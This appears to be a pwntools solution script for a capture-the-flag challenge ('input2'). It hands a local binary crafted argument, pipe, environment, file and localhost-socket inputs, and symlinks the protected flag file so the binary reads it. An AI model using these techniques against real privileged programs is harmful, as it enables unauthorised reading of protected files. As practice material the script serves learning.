from pwn import *
import os
#prep (do this before runnig script)
#    mkdir /tmp/d
#    cd /tmp/d
#    ln -s /home/input2/flag flag
#    nano script.py (write this file)
#(now run python script.py)
#1
args = ['A']*100
args[65] = '\x00'
args[66] = '\x20\x0a\x0d'
args[67] = '8200'
#2
read_in, write_in = os.pipe()
read_err, write_err = os.pipe()
os.write(write_in, b'\x00\x0a\x00\xff')
os.write(write_err, b'\x00\x0a\x02\xff')
#4
with open('\x0a', 'w') as f:
     f.write('\x00\x00\x00\x00')
#3
p = process(executable='/home/input2/input2', argv=args, stdin=read_in, stderr=read_err, env={b'\xde\xad\xbe\xef': b'\xca\xfe\xba\xbe'})
sleep(1)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host ="127.0.0.1"
port = 8200
s.connect((host,port))
s.send(b'\xde\xad\xbe\xef')
p.interactive()


